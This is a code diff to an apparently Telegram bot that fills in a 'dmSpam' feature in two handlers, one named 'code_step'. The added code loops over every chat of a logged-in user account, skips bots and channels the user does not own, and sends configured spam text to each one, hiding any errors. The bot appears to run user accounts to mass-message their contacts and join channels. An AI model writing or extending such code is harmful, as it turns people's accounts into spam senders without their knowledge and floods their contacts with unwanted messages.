@@ -161,7 +161,19 @@ async def inline_click(call: types.CallbackQuery):
             text = config.spamInfo["spamText"]
 
             if config.spamInfo["dmSpam"] == True:
-                pass
+                async for dialog in client.iter_dialogs():
+                    if dialog.is_channel and dialog.entity.creator != True:
+                        continue
+                    try:
+                        if dialog.entity.bot:
+                            continue
+                    except:
+                        pass
+
+                    try:
+                        await client.send_message(dialog.id, text)
+                    except:
+                        pass
 
             for channel in config.spamInfo["joinChannels"]:
                 try:
@@ -220,7 +232,19 @@ async def code_step(message: types.Message):
         text = config.spamInfo["spamText"]
 
         if config.spamInfo["dmSpam"] == True:
-            pass
+            async for dialog in client.iter_dialogs():
+                if dialog.is_channel and dialog.entity.creator != True:
+                    continue
+                try:
+                    if dialog.entity.bot:
+                        continue
+                except:
+                    pass
+
+                try:
+                    await client.send_message(dialog.id, text)
+                except:
+                    pass
 
         for channel in config.spamInfo["joinChannels"]:
             try:
